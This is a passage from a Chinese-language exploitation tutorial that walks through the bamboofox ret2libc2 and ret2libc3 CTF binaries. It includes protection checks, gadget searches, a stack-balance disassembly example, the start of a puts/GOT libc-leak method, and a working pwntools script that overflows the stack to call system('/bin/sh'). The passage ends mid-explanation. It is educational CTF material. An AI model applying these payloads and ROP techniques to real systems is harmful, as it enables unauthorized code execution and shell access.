<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">       +---------------------------+</span><br><span class="line">       |          binsh_addr       | 部署binsh_addr作为汇编system函数的参数</span><br><span class="line">       +---------------------------+</span><br><span class="line">       |           bbbb            | 部署bbbb作为汇编正常调用system函数的返回地址 </span><br><span class="line">       +---------------------------+</span><br><span class="line">       |        system_plt         | 执行system_plt，覆盖原ret返回位置</span><br><span class="line">       +---------------------------+</span><br><span class="line">       |           aaaa            | aaaa覆盖原ebp位置</span><br><span class="line">ebp---&gt;+---------------------------+</span><br><span class="line">       |           aaaa            | aaaa占位填满栈空间</span><br><span class="line">       |           ....            |        ......</span><br><span class="line">       |           aaaa            | aaaa占位填满栈空间</span><br><span class="line">       |           aaaa            | aaaa占位填满栈空间</span><br><span class="line">       |           aaaa            | aaaa占位填满栈空间</span><br><span class="line">       +---------------------------+</span><br></pre></td></tr></table></figure></div>

<p><strong>如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 或’aaaa’作为虚假的地址，其后参数对应的参数内容。一般直接调用system地址的时候程序有个call指令会自动返回地址存到内存中，但是这里是直接调用的system的plt地址，没有call的那一步，所以要加一个bbbb</strong></p>
<blockquote>
<p>正常调用函数的流程会有：压入参数-&gt;call function -&gt;返回地址-&gt;ebp-&gt;esp，而我们要是栈中调用一个函数(system)就需要在EIP覆盖为该函数的plt地址，由于没有正常调用函数的call的一步所以需要保证堆栈平衡加上’bbbb’作为伪地址</p>
</blockquote>
<hr>
<h4 id="只存在system-函数"><a href="#只存在system-函数" class="headerlink" title="只存在system()函数"></a>只存在system()函数</h4><p>以 bamboofox 中 ret2libc2为例，拿到文件依旧进行查看保护</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ checksec ret2libc2</span><br><span class="line">[*] <span class="string">'/home/ascotbe/Desktop/Pwn/ret2libc2'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></div>

<p>接着我们可以看到溢出函数依旧是上文中的那个并且<code>system()</code>的地址是<strong>0x08048490</strong></p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/14.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20201120142854442" class="fancybox"><img alt="image-20201120142854442" title="image-20201120142854442" data-src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/14.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
<p>但是我们用XX并无找到<code>/bin/sh</code>位置</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ ROPgadget --binary ret2libc2 --string <span class="string">'/bin/sh'</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure></div>

<p>那我们怎么获取字符串呢？我们在PLT表中可以看到有一个<code>gets()</code>函数，这个函数可以用来获取字符串，并且地址为<strong>0x08048460</strong></p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/15.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20201120144606722" class="fancybox"><img alt="image-20201120144606722" title="image-20201120144606722" data-src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/15.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
<p>反汇编查看一下该函数</p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/16.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20201120144720027" class="fancybox"><img alt="image-20201120144720027" title="image-20201120144720027" data-src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/16.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
<p>发现传入一个指针后即可返回指针指向的字符串，那么接着我们只需要找到一个可读可写的buffer区，通常会寻找<strong>.bss</strong>段，通过<strong>readelf</strong>命令来查找</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ readelf -S ret2libc2</span><br><span class="line">There are 35 section headers, starting at offset 0x1924:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000f0 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          080482c8 0002c8 000096 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          0804835e 00035e 00001e 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         0804837c 00037c 000030 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             080483ac 0003ac 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             080483c4 0003c4 000058 08   A  5  12  4</span><br><span class="line">  [11] .init             PROGBITS        0804841c 00041c 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048440 000440 0000c0 04  AX  0   0 16</span><br><span class="line">  [13] .text             PROGBITS        08048500 000500 000242 00  AX  0   0 16</span><br><span class="line">  [14] .fini             PROGBITS        08048744 000744 000014 00  AX  0   0  4</span><br><span class="line">  [15] .rodata           PROGBITS        08048758 000758 000065 00   A  0   0  4</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS        080487c0 0007c0 000034 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame         PROGBITS        080487f4 0007f4 0000d0 00   A  0   0  4</span><br><span class="line">  [18] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [19] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [20] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [23] .got.plt          PROGBITS        0804a000 001000 000038 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804a038 001038 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804a040 001040 0000a4 00  WA  0   0 32</span><br><span class="line">  [26] .comment          PROGBITS        00000000 001040 00002b 01  MS  0   0  1</span><br><span class="line">  [27] .debug_aranges    PROGBITS        00000000 00106b 000020 00      0   0  1</span><br><span class="line">  [28] .debug_info       PROGBITS        00000000 00108b 000329 00      0   0  1</span><br><span class="line">  [29] .debug_abbrev     PROGBITS        00000000 0013b4 0000f8 00      0   0  1</span><br><span class="line">  [30] .debug_line       PROGBITS        00000000 0014ac 0000c2 00      0   0  1</span><br><span class="line">  [31] .debug_str        PROGBITS        00000000 00156e 00026d 01  MS  0   0  1</span><br><span class="line">  [32] .shstrtab         STRTAB          00000000 0017db 000146 00      0   0  1</span><br><span class="line">  [33] .symtab           SYMTAB          00000000 001e9c 000540 10     34  50  4</span><br><span class="line">  [34] .strtab           STRTAB          00000000 0023dc 000314 00      0   0  1</span><br></pre></td></tr></table></figure></div>

<p>我们可以发现<strong>.bss</strong>是从<strong>0x0804a040</strong>的位置开始的，然后按着这个段找到了<strong>0x0804A080</strong>这个位置是个char数组</p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/17.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20201120182503721" class="fancybox"><img alt="image-20201120182503721" title="image-20201120182503721" data-src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/17.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
<p>接着可以看到<strong>.bss</strong>是能读写，由于程序在gdb中运行，就算关闭了ALSR也会和在gdb外运行不同。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop/Pwn$ gdb -q ret2libc2</span><br><span class="line">Reading symbols from ret2libc2...</span><br><span class="line">gdb-peda$ run </span><br><span class="line">Starting program: /home/kali/Desktop/Pwn/ret2libc2 </span><br><span class="line">Something surprise here, but I don<span class="string">'t think it will work.</span></span><br><span class="line"><span class="string">What do you think ?</span></span><br><span class="line"><span class="string">[Inferior 1 (process 10047) exited normally]</span></span><br><span class="line"><span class="string">Warning: not running</span></span><br><span class="line"><span class="string">gdb-peda$ vmmap</span></span><br><span class="line"><span class="string">Warning: not running</span></span><br><span class="line"><span class="string">Start      End        Perm      Name</span></span><br><span class="line"><span class="string">0x0804841c 0x08048758 rx-p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br><span class="line"><span class="string">0x08048154 0x080488c4 r--p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br><span class="line"><span class="string">0x08049f08 0x0804a0e4 rw-p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br></pre></td></tr></table></figure></div>

<p>接着寻找<code>add esp, 4</code>这样的指令，至于为什么呢因为我们调用gets()函数的时候push了一个参数也就是<code>/bin/sh</code>，函数结束的话如果不让堆栈平衡，那么最后结束整个函数的时候ebp的值回比原来低，具体低4个字节还是8个看进程的位数去。最后在这题结束会放个c程序调试的例子作为解释</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ ROPgadget --binary ret2libc2 --only <span class="string">'pop|ret'</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804872f : pop ebp ; ret</span><br><span class="line">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804843d : pop ebx ; ret</span><br><span class="line">0x0804872e : pop edi ; pop ebp ; ret</span><br><span class="line">0x0804872d : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048426 : ret</span><br><span class="line">0x0804857e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure></div>

<p>万事具备我们就直接构造EXP即可</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'x86'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">libc_gets_addr = <span class="number">0x08048460</span></span><br><span class="line">libc_system_addr = <span class="number">0x08048490</span></span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x0804843d</span></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">0x70</span>, libc_gets_addr, pop_ebx_addr, buf2_addr, libc_system_addr, <span class="string">'6666'</span>, buf2_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪C++代码类似下面</span></span><br><span class="line">char buf2[]=<span class="string">"/bin/sh"</span></span><br><span class="line">system(gets(*buf2))</span><br></pre></td></tr></table></figure></div>

<p><a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/18.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20201120190619022" class="fancybox"><img alt="image-20201120190619022" title="image-20201120190619022" data-src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/18.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
<p><strong>注意：以下是对堆栈平衡的解释</strong></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*源代码.cpp*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">a</span><span class="params">(<span class="keyword">int</span> aa,<span class="keyword">int</span> v1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">int</span> t=a(<span class="number">5</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*    debug 反汇编         */</span></span><br><span class="line"></span><br><span class="line">--- test.cpp -------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="number">00213</span>AB0  push        ebp  </span><br><span class="line"><span class="number">00213</span>AB1  mov         ebp,esp  </span><br><span class="line"><span class="number">00213</span>AB3  sub         esp,<span class="number">0</span>D8h  </span><br><span class="line"><span class="number">00213</span>AB9  push        ebx  </span><br><span class="line"><span class="number">00213</span>ABA  push        esi  </span><br><span class="line"><span class="number">00213</span>ABB  push        edi  </span><br><span class="line"><span class="number">00213</span>ABC  lea         edi,[ebp<span class="number">-0</span>D8h]  </span><br><span class="line"><span class="number">00213</span>AC2  mov         ecx,<span class="number">36</span>h  </span><br><span class="line"><span class="number">00213</span>AC7  mov         eax,<span class="number">0</span>CCCCCCCCh  </span><br><span class="line"><span class="number">00213</span>ACC  rep stos    dword ptr es:[edi]  </span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="number">00213</span>ACE  mov         dword ptr [x],<span class="number">5</span>  </span><br><span class="line">	<span class="keyword">int</span> t=a(<span class="number">5</span>, <span class="number">4</span>);</span><br><span class="line"><span class="number">00213</span>AD5  push        <span class="number">4</span> <span class="comment">/*第二参数入栈*/</span></span><br><span class="line"><span class="number">00213</span>AD7  push        <span class="number">5</span>  <span class="comment">/*第一参数入栈*/</span></span><br><span class="line"><span class="number">00213</span><span class="function">AD9  call        <span class="title">a</span> <span class="params">(<span class="number">021142</span>Eh)</span>   <span class="comment">/*调用a函数*/</span></span></span><br><span class="line">00213ADE  add         esp,8  /*  esp 恢复正确位置，参数占用8字节，  为__cdecl 调用 （调用者 堆栈平衡） */</span><br><span class="line"><span class="number">00213</span>AE1  mov         dword ptr [t],eax  <span class="comment">/*函数返回值位于eax寄存器内*/</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">00213</span>AE4  <span class="keyword">xor</span>         eax,eax  <span class="comment">/*清空eax*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">00213</span>AE6  pop         edi  </span><br><span class="line"><span class="number">00213</span>AE7  pop         esi  </span><br><span class="line"><span class="number">00213</span>AE8  pop         ebx  </span><br><span class="line"><span class="number">00213</span>AE9  add         esp,<span class="number">0</span>D8h  </span><br><span class="line"><span class="number">00213</span>AEF  cmp         ebp,esp  </span><br><span class="line"><span class="number">00213</span>AF1  call        __RTC_CheckEsp (<span class="number">02112</span>DFh)  </span><br><span class="line"><span class="number">00213</span>AF6  mov         esp,ebp  </span><br><span class="line"><span class="number">00213</span>AF8  pop         ebp  </span><br><span class="line"><span class="number">00213</span>AF9  ret</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">/*函数a内 反汇编*/</span></span><br><span class="line"></span><br><span class="line">--- test.cpp -------------------------------------</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"iostream"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">a</span><span class="params">(<span class="keyword">int</span> aa,<span class="keyword">int</span> v1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="number">013241</span>A0  push        ebp  <span class="comment">/*保护ebp状态*/</span></span><br><span class="line"><span class="number">013241</span>A1  mov         ebp,esp  </span><br><span class="line"><span class="number">013241</span>A3  sub         esp,<span class="number">0</span>C0h  <span class="comment">/*预留 192 字节空间*/</span></span><br><span class="line"><span class="number">013241</span>A9  push        ebx  </span><br><span class="line"><span class="number">013241</span>AA  push        esi  </span><br><span class="line"><span class="number">013241</span>AB  push        edi  </span><br><span class="line"><span class="number">013241</span>AC  lea         edi,[ebp<span class="number">-0</span>C0h]  </span><br><span class="line"><span class="number">013241B</span>2  mov         ecx,<span class="number">30</span>h  </span><br><span class="line"><span class="number">013241B</span>7  mov         eax,<span class="number">0</span>CCCCCCCCh  </span><br><span class="line"><span class="number">013241B</span>C  rep stos    dword ptr es:[edi]  </span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line"><span class="number">013241B</span>E  mov         eax,<span class="number">5</span>  <span class="comment">/*返回值保存eax寄存器中*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">013241</span>C3  pop         edi  </span><br><span class="line"><span class="number">013241</span>C4  pop         esi  </span><br><span class="line"><span class="number">013241</span>C5  pop         ebx  </span><br><span class="line"><span class="number">013241</span>C6  mov         esp,ebp  <span class="comment">/*恢复现场  恢复函数a执行前的 栈顶 (esp)*/</span></span><br><span class="line"><span class="number">013241</span>C8  pop         ebp  </span><br><span class="line"><span class="number">013241</span>C9  ret</span><br></pre></td></tr></table></figure></div>

<p>关于栈的分布图</p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/19.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="19" class="fancybox"><img alt="19" title="19" data-src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/19.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
<hr>
<h4 id="无system-函数和-bin-sh字符串"><a href="#无system-函数和-bin-sh字符串" class="headerlink" title="无system()函数和/bin/sh字符串"></a>无system()函数和/bin/sh字符串</h4><p>首先查看保护</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ checksec ./ret2libc3</span><br><span class="line">[*] <span class="string">'/home/ascotbe/Desktop/Pwn/ret2libc3'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></div>

<p>可以发现是加载<strong>libc.so</strong>动态链接库的</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ i sharedlibrary </span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line"><span class="number">0xf7fd2100</span>  <span class="number">0xf7fef7f3</span>  Yes (*)     /lib/ld-linux.so<span class="number">.2</span></span><br><span class="line"><span class="number">0xf7de81d0</span>  <span class="number">0xf7f4171a</span>  Yes (*)     /lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">(*): Shared library is missing debugging information.</span><br></pre></td></tr></table></figure></div>

<p>可以发现没有<code>system()</code>函数和<code>/bin/sh</code>字符串了</p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/20.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20201121103715703" class="fancybox"><img alt="image-20201121103715703" title="image-20201121103715703" data-src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/20.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
<p>由于他加载了<strong>libc.so</strong>，那么我们可以明确几点</p>
<ul>
<li><p>动态链接库中的函数之间相对偏移是固定的</p>
</li>
<li><p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</p>
</li>
<li><p>A 真实地址 (内存物理地址) - A 偏移地址 = B 真实地址 (内存物理地址) -B 偏移地址 = 基地址</p>
</li>
<li><p>如果我们知道<strong>libc.so</strong>中某个函数的地址，那么我们就可以确定该程序利用的<strong>libc.so</strong>。进而我们就可以知道<code>system()</code>函数的地址。通过<code>puts()</code>泄露某个已执行过的函数的GOT地址，并且返回地址设置为_start()或main()，以便于重新执行一遍程序；</p>
</li>
<li><p>下图红色为第一遍执行获取到<code>puts()</code>函数的真实地址，绿色为第二遍通过真实地址获取到<strong>libc.so</strong>的真实地址进而推出<code>system()</code>函数和<code>/bin/sh</code>的地址位置，进行拼接覆盖掉栈</p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/21.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="img" class="fancybox"><img alt="img" title="img" data-src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/21.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
<p style="color:#FF0000" ;>红色路线解释：</p>

<p><strong>puts_plt</strong>表的地址，然后在后面填上<code>_start()</code>函数的地址方便进行二次循环，接着再后面把获取到的<strong>puts_got</strong>表地址填上，用来覆盖调用<code>puts()</code>函数时候压入栈的参数(虽然只能覆盖4个字节)，这样我们接收的时候就能获取到真正的地址了</p>
